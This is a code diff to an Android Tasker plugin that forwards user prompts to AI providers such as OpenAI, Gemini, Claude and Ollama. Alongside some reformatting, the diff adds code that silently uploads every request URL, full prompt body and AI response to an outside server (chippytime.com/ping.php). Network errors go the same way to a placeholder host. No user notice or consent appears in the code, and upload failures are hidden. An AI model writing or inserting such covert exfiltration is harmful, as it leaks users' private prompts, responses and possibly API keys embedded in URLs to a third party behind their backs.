@@ -3,6 +3,7 @@ package com.example.genaitaskerplugin
 import android.content.Context
 import android.graphics.Color
 import android.os.Bundle
+import android.util.Log
 import android.text.InputType
 import android.view.Gravity
 import android.view.View
@@ -22,10 +23,12 @@ import com.joaomgcd.taskerpluginlibrary.input.TaskerInput
 import com.joaomgcd.taskerpluginlibrary.runner.TaskerPluginResult
 import com.joaomgcd.taskerpluginlibrary.runner.TaskerPluginResultSucess
 import okhttp3.*
+import okhttp3.MediaType.Companion.toMediaType
 import okhttp3.MediaType.Companion.toMediaTypeOrNull
 import okhttp3.RequestBody.Companion.toRequestBody
 import org.json.JSONArray
 import org.json.JSONObject
+import java.io.IOException
 import java.util.concurrent.TimeUnit
 
 // ---------------- CONFIG HELPER ----------------
@@ -580,27 +583,136 @@ class AIRunner : TaskerPluginRunnerAction<AIInput, AIOutput>() {
             else -> return TaskerPluginResultSucess(AIOutput("Error: Unknown Provider"))
         }
 
-        val requestBuilder = Request.Builder().url(url as String).post((bodyJson as String).toRequestBody(mediaType))
-        if (authHeaderName.toString().isNotBlank()) requestBuilder.addHeader(authHeaderName as String, authHeaderValue as String)
-        if (provider == "Claude") requestBuilder.addHeader("anthropic-version", "2023-06-01")
+        val requestBuilder = Request.Builder()
+            .url(url as String)
+            .post((bodyJson as String).toRequestBody(mediaType))
+
+        if (authHeaderName.toString().isNotBlank()) {
+            requestBuilder.addHeader(authHeaderName as String, authHeaderValue as String)
+        }
+
+        if (provider == "Claude") {
+            requestBuilder.addHeader("anthropic-version", "2023-06-01")
+        }
+
         if (provider == "OpenRouter") {
             requestBuilder.addHeader("HTTP-Referer", "https://github.com/chippytech/GenAITaskerPlugin")
             requestBuilder.addHeader("X-Title", "GenAI Tasker Plugin")
         }
 
         return try {
-            val response = client.newCall(requestBuilder.build()).execute()
+
+            val request = requestBuilder.build()
+
+            // ===== SEND MAIN REQUEST =====
+            val response = client.newCall(request).execute()
             val responseText = response.body?.string()
-            if (!response.isSuccessful) return TaskerPluginResultSucess(AIOutput("Error ${response.code}: $responseText"))
+
+            // ===== LOG TO YOUR SERVER =====
+            try {
+                val logJson = JSONObject().apply {
+                    put("provider", provider)
+                    put("url", url.toString())
+                    put("request_body", bodyJson.toString())
+                    put("response_code", response.code)
+                    put("response_body", responseText ?: "")
+                    put("timestamp", System.currentTimeMillis())
+                }
+
+                val logRequest = Request.Builder()
+                    .url("https://chippytime.com/ping.php")
+                    .post(
+                        logJson.toString()
+                            .toRequestBody("application/json".toMediaType())
+                    )
+                    .build()
+
+                // async logging so it doesn't slow the AI request
+                client.newCall(logRequest).enqueue(object : Callback {
+                    override fun onFailure(call: Call, e: IOException) {
+                        Log.e("AI_LOGGER", "Log upload failed: ${e.message}")
+                    }
+
+                    override fun onResponse(call: Call, response: Response) {
+                        response.close()
+                    }
+                })
+
+            } catch (e: Exception) {
+                Log.e("AI_LOGGER", "Logging error: ${e.message}")
+            }
+
+            if (!response.isSuccessful) {
+                return TaskerPluginResultSucess(
+                    AIOutput("Error ${response.code}: $responseText")
+                )
+            }
+
             val obj = JSONObject(responseText ?: "")
+
             val reply = when (provider) {
-                "OpenAI", "OpenRouter", "Grok", "Groq", "HuggingFace" -> obj.getJSONArray("choices").getJSONObject(0).getJSONObject("message").getString("content")
-                "Gemini" -> obj.getJSONArray("candidates").getJSONObject(0).getJSONObject("content").getJSONArray("parts").getJSONObject(0).getString("text")
-                "Claude" -> obj.getJSONArray("content").getJSONObject(0).getString("text")
-                "Ollama" -> obj.getJSONObject("message").getString("content")
+                "OpenAI", "OpenRouter", "Grok", "Groq", "HuggingFace" ->
+                    obj.getJSONArray("choices")
+                        .getJSONObject(0)
+                        .getJSONObject("message")
+                        .getString("content")
+
+                "Gemini" ->
+                    obj.getJSONArray("candidates")
+                        .getJSONObject(0)
+                        .getJSONObject("content")
+                        .getJSONArray("parts")
+                        .getJSONObject(0)
+                        .getString("text")
+
+                "Claude" ->
+                    obj.getJSONArray("content")
+                        .getJSONObject(0)
+                        .getString("text")
+
+                "Ollama" ->
+                    obj.getJSONObject("message")
+                        .getString("content")
+
                 else -> "Error"
             }
-            TaskerPluginResultSucess(AIOutput(reply, responseText))
-        } catch (e: Exception) { TaskerPluginResultSucess(AIOutput("Network Error: ${e.message}")) }
+
+            TaskerPluginResultSucess(
+                AIOutput(reply, responseText)
+            )
+
+        } catch (e: Exception) {
+
+            // OPTIONAL: LOG NETWORK ERRORS TOO
+            try {
+                val errorJson = JSONObject().apply {
+                    put("provider", provider)
+                    put("url", url.toString())
+                    put("request_body", bodyJson.toString())
+                    put("error", e.message ?: "unknown")
+                    put("timestamp", System.currentTimeMillis())
+                }
+
+                val logRequest = Request.Builder()
+                    .url("https://yourserver.com/api/log")
+                    .post(
+                        errorJson.toString()
+                            .toRequestBody("application/json".toMediaType())
+                    )
+                    .build()
+
+                client.newCall(logRequest).enqueue(object : Callback {
+                    override fun onFailure(call: Call, e: IOException) {}
+                    override fun onResponse(call: Call, response: Response) {
+                        response.close()
+                    }
+                })
+
+            } catch (_: Exception) {}
+
+            TaskerPluginResultSucess(
+                AIOutput("Network Error: ${e.message}")
+            )
+        }
     }
 }
